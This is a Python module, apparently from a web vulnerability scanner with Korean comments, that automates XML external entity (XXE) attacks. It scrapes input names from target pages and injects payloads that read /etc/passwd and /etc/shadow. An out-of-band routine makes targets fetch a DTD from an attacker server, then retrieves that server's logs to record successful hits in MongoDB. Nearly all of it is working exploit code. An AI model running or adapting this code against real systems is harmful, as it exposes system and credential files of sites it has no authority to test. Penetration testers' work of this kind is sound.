from os import name
import requests, copy, sys, re, socket, time
from pymongo import MongoClient
from pymongo.cursor import CursorType
import requests
from bs4 import BeautifulSoup


ATTACKERSERVER = ""
client_socket = ""
session = requests.Session()
mongo = "" 




class schema :
    def __init__(self, type : str) :
        self.type = type
        self.url = ''
        self.isHack = False
        self.totUse = 0
        self.content = str()

    def setUrl(self, url : str) :
        self.url = url

    def setisHackOob(self,cnt) :
        self.totUse = cnt
        if self.totUse > 0 : self.isHack = True

    def setisHack(self):
        self.isHack = True
        

    def settotUse(self, totUse : int) :
        self.totUse = totUse

    def setContent(self, content : str) :
        self.content += content
        self.content += "\n"


def sendMsg(client_socket, msg) :
    client_socket.sendall(msg)

def getMsg(client_socket) :
    data = client_socket.recv(1024)
    return data

def insertItem(item : schema):
    global mongo
    db_name = "WAS"   
    collection_name = "xxe" 
    
    data = {
        "type" : item.type ,
        "url" : item.url ,
        "isHack":item.isHack,
        "totUse" : item.totUse,
        "content" : item.content
        }

    mongo[db_name][collection_name].insert_one(data)


# db에서 모든 값을 읽어옴 
def findItem():
    global mongo
    db_name = "WAS"     # static 
    collection_name = "xxe" #static
    result = mongo[db_name][collection_name].find(
                                                {"isHack" : True } ,
                                                {"_id" : 0 ,
                                                "type" : 1,
                                                "url" : 1,
                                                "content":1}
                                                ).sort("url")

    return result 




# routine : 메인 호출 부분
# argument : None
# return value : None
def xxe(target_urls : list):
    db_name = "WAS"   
    collection_name = "xxe" 

    mongo[db_name][collection_name].drop()

    genXxeAttack(target_urls)

    sendMsg(client_socket, "reset".encode())

    oobXxeAttack(target_urls)

    finalDetail()




# routine : 일반적인 xxe exploit을 보낸 후 디비에 전송함
# argument : None
# return value : None

def genXxeAttack(target_urls : list):
    target_files = {
    "root:x:"  : "file:///etc/passwd",
    "root:$" : "file:///etc/shadow" 
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/xml' }

    for target_url in target_urls:
        name_list = getNameList(target_url)

        for xxe_keyword, target_file in target_files.items():

            new_schema = schema("LFI")
            new_schema.setUrl(target_url)
            payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}"> ]><foo>&xxe;</foo>'''.format(target_file)
            
            for tag_name in name_list:
                
                data = {
                    tag_name : payload
                }

                response = session.post(target_url, data = data , headers = headers)

                response_data = response.text

                print(payload)


                if response_data.find(xxe_keyword) != -1:
                    
                    new_schema.setisHack()
                    new_schema.setContent(response_data)
                
                insertItem(new_schema)


def getNameList(url : str) -> list :
    global session
    name_list = list()
    res = session.get(url)
    res_text = res.text
    soup = BeautifulSoup(res_text,'lxml')
    

    # 자바스크립트 태그 읽기
    jas = str(soup).split("\n")

    for jas_line in jas:
        jas_keyword = '''setAttribute('name',"'''
        jas_index = jas_line.find('''setAttribute('name',"''')
        if jas_index != -1 :
            jas_name = jas_line[jas_index + len(jas_keyword) : jas_line.find('"', jas_index + len(jas_keyword))]
            name_list.append(jas_name)


    # html 태그 읽기
    html = soup.find_all('input')

    html_keyword = 'name="'

    for html_line in html:
        html_line = str(html_line)
        html_index = html_line.find(html_keyword)
        if html_index != -1:
            html_name = html_line[html_index + len(html_keyword) : html_line.find(' ', html_index) - 1]
            name_list.append(html_name)

    return name_list


    

# routine : oob xxe exploit을 보냄
# return value : None
def oobXxeAttack(target_urls : list):

    global target_url, session


    headers = {'Content-Type': 'application/xml;charset=UTF-8',
                'Accept': 'application/xml' }

    for target_url in target_urls:
        url = '{}url/{}'.format(ATTACKERSERVER,target_url)
        requests.get(url)   
        # Crafting XXE Payload
        payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit5.dtd"> %xxe; ]>'.format(ATTACKERSERVER)
        response = session.post(target_url, data = payload, headers = headers)
            

# routine : 최종 report 를 출력해주는 부분
# argument : None
# return value : None
def finalDetail():
    resultRequest()

    cursor = findItem()
    prior_url = str()
    for doc in cursor:
        url = doc.get("url")
        if url != prior_url:
            print("\n\n  [ {} ]  \n".format(url))
        for key, value in doc.items():
            if(key == "url") :
                prior_url = value
                continue
            print( " {}  :  {} ".format(key,value) )



# routine : 공격자 서버에서 공격 log 를 받아옴 
# argument : None
# return value : 로그를 string 형태로 반환 ( 필터링되지 않은 상태 )

def resultRequest():
    sendMsg(client_socket, "result".encode("utf-8"))
    data = getMsg(client_socket)
    sendMsg(client_socket, data)
    data_transferred = 0 
    result = str()


    if data == None:
        print("\n\n   [ ERROR : File does not exist in server ] \n\n")
        return "RESULT_ERROR"

    
    try:
        while data:
            result += repr(data)
            data_transferred += len(data)
            data = getMsg(client_socket).decode("utf-8")
            sendMsg(client_socket, data.encode("utf-8"))
            if(data == "end"):
                break
    except Exception as ex:
            print("\n\n   [ ERROR : ", ex ," ]  \n\n")
            return "RESULT_ERROR"


    #print("\n\n** [ LOG ] Size of transferred data  : {} bytes \n\n".format(data_transferred))
    craftResult(result)
    


# routine : 받아온 log를 필터링 함
# argument : 원본 로그 
# return value : 필터링한 로그 

def craftResult(result : str):
    result = '"""{}"""'.format(result)    
    new_schema = schema("OOB")     
    result = result.split("\\n")
    url = str()

    for line in result:
        try:
            if( int(line.split(' ')[8]) != 404):
                continue
        except:
            continue


        line = re.sub("''","",line)
        if(line.find('/exploit/') != -1) : 
            new_schema.setContent(line[line.find('/exploit/'):line.find('http/1.1')])
        else :
            if(new_schema.url) :
                count_use = new_schema.content.count('\n')
                new_schema.setisHackOob(count_use)
                insertItem(new_schema)

                new_schema = schema("OOB")
            new_schema.setUrl(line[line.find('/url') + 5:])

    count_use = new_schema.content.count('\n')
    new_schema.setisHackOob(count_use)
    insertItem(new_schema)
    

